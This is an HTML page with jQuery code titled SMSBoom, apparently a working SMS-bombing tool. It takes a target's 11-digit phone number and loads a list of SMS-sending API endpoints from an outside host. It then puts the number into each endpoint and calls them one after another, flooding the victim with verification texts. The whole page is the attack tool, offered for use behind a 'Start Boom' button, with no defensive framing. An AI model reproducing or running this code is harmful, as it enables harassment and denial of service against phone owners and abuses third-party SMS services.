<!DOCTYPE html>
<html>

<head>
    <title>SMSBoom</title>
    <!--<script src="https://code.jquery.com/jquery-3.7.0.js"></script>-->
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <script>
        //var phoneNumber = $("#phoneNumber").val();
        var str = "";
        $(document).ready(function () {
            $("#sendSMS").click(function () {
                var phoneNumber = $("#phoneNumber").val();
                str = phoneNumber;
                if (phoneNumber.length != 11) {
                    alert("请输入有效的手机号码！");
                    console.log(phoneNumber);
                    return;
                }
                $.ajax({
                    url: `https://hk1.monika.love/OpenEthan/SMSBoom/master/GETAPI.json`, // 发送短信的后端处理文件
                    method: "GET",
                    //data: { phoneNumber: phoneNumber },
                    success: async function (response) {
                        //alert("短信已发送！");
                        console.log(response);
                        try {
                            response = JSON.parse(response)
                        } catch (error) {
                            
                        }
                        for (let i = 0; i < response.length; i++) {

                            await SMSBoom(response[i], str);
                        }
                    },
                    error: function () {
                        //alert("发送短信时出错！");
                        console.log();
                    },
                });
            });
        });
        function SMSBoom(api, phoneNumber) {
            //console.log(api);
            let url = api.replaceAll("[phone]", phoneNumber);
            $.ajax({
                url: url, // 发送短信的后端处理文件
                method: "GET",
                //data: { phoneNumber: phoneNumber },
                success: function (response) {
                    //alert("短信已发送！");
                    console.log("短信已发送！");
                    //console.log(response);
                },
                error: function () {
                    //alert("发送短信时出错！");
                    console.log(`发送短信时出错！`);
                },
            });
        }
    </script>
</head>

<body>
    <label for="phoneNumber">手机号码：</label>
    <input type="text" id="phoneNumber" name="phoneNumber" placeholder="请输入手机号码" />
    <button id="sendSMS">Start Boom</button>
</body>

</html>
